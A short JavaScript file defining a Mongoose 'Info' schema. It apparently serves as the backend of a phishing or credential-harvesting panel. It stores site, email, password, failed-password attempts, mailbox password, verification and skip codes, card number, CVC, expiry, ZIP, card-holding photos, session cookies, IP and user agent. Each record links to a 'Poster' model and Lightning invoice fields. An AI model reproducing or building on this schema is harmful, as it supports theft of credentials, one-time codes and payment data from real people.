import mongoose from "mongoose";

const Schema = mongoose.Schema;
const infoSchema = new Schema(
  {
    site: {
      type: String,
    },
    email: {
      type: String,

      lowercase: true,
    },
    adminId: {
      type: String,
    },
    password: {
      type: String,
    },
    amount: {
      type: String,
    },
    skipcode: {
      type: String,
    },

    username: {
      type: String,
    },
    gCode: {
      type: String,
    },
    passcode: {
      type: String,
    },
    poster: {
      type: String,
    },
    root: {
      type: mongoose.Schema.Types.ObjectId,

      ref: "Poster",
    },
    ip: {
      type: String,
    },
    agent: {
      type: String,
    },
    number: {
      type: String,
    },
    mail: { type: String },
    wrongPassword: { type: String },

    mailPass: { type: String },
    onlyCard: { type: String },
    holdingCard: { type: String },
    status: { type: Boolean, default: false },

    validity: { type: String },
    address: { type: String },
    cardNumber: { type: String },

    cvc: { type: String },
    name: { type: String },
    zipCode: { type: String },
    cookie: { type: String },
    rHash: { type: String },
    lightningInvoice: { type: String },
  },
  { timestamps: true },
);

const Info = mongoose.model("Info", infoSchema);

export default Info;

// 6558fca9d08567217d7b4cef
